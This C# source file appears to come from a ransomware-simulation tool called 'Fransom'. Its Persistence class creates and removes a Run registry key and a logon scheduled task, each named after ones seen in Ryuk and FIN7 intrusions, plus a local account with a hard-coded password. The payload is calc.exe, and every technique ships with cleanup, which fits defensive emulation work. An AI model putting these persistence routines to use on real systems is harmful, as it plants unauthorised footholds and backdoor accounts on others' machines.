using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices;

namespace Fransom
{
    class Persistence
    {
        public void UserRegKey()
        {
            try
            {
                string keypath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
                string keyname = "Backup Mgr"; //from Ryuk
                string command = "\"c:\\windows\\system32\\calc.exe\"";
                RegistryKey regkey;
                regkey = Registry.CurrentUser.CreateSubKey(keypath);
                regkey.SetValue(keyname, command);
                regkey.Close();
                Logger.WriteLine(String.Format("[+] Created User HKCU:{0} key '{1}' and set to {2}", keypath, keyname, command));
            }
            catch (Exception e)
            {
                Logger.WriteLine("[-] Error: " + e.Message);
            }
        }

        public void CleanupUserRegKey()
        {
            try
            {
                string keypath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
                string keyname = "Backup Mgr"; //from Ryuk
                RegistryKey regkey;
                regkey = Registry.CurrentUser.OpenSubKey(keypath, true);
                regkey.DeleteValue(keyname);
                regkey.Close();
                Logger.WriteLine(String.Format("[+] Cleaned up HKCU:{0} {1} key", keypath, keyname));
            }
            catch (ArgumentException)
            {
                Logger.WriteLine("[-] Error: Selected Registry value does not exist");
            }
        }

        public void CreateScheduledTask()
        {
            string user = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            string TaskName = "FODCleanupTask"; //from FIN7, Carbanak
            string Command = "\"c:\\windows\\system32\\calc.exe\"";
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "Add a new scheduled task that will spawn calc.exe at user logon.";
                LogonTrigger logonTrigger = new LogonTrigger();
                LogonTrigger lTrigger = (LogonTrigger)td.Triggers.Add(new LogonTrigger());
                lTrigger.Delay = TimeSpan.FromMinutes(1);
                lTrigger.UserId = user;
                td.Actions.Add(new ExecAction(Command,null,null));
                td.Principal.Id = user;
                ts.RootFolder.RegisterTaskDefinition(@TaskName, td, TaskCreation.CreateOrUpdate, null, null, TaskLogonType.InteractiveToken, null);
                Logger.WriteLine(String.Format("[+] Created Scheduled Task with name '{0}' to run {1} at logon.", TaskName, Command));
            }
        }

        public void RemoveScheduledTask()
        {
            using (TaskService ts = new TaskService())
            {
                string TaskName = "FODCleanupTask"; //from FIN7, Carbanak
                ts.RootFolder.DeleteTask(TaskName);
                Logger.WriteLine(String.Format("[+] Removed Scheduled Task with name '{0}'", TaskName));
            }
        }
        public void CreateLocalAccount()
        {
            try
            {
                string username = "fransom";
                string password = "Fr@ns0m123!";
                PrincipalContext context = new PrincipalContext(ContextType.Machine);
                UserPrincipal user = new UserPrincipal(context);
                user.SetPassword(password);
                user.DisplayName = username;
                user.Name = username;
                user.Save();
                GroupPrincipal group = GroupPrincipal.FindByIdentity(context, "Users");
                group.Members.Add(user);
                group.Save();
                Logger.WriteLine(String.Format("[+] Created Local Account with username '{0}' and password '{1}'.", username, password));
            }
            catch (Exception e)
            {
                Logger.WriteLine("[-] Error: " + e.Message);
            }
        }
        public void RemoveLocalAccount()
        {
            try
            {
                string username = "fransom";
                DirectoryEntry localDirectory = new DirectoryEntry("WinNT://" + Environment.MachineName.ToString());
                DirectoryEntries users = localDirectory.Children;
                DirectoryEntry user = users.Find(username);
                users.Remove(user);
                Logger.WriteLine(String.Format("[+] Removed Local Account with username '{0}'.", username));
            }
            catch (Exception e)
            {
                Logger.WriteLine("[-] Error: " + e.Message);
            }
        }
    }
}
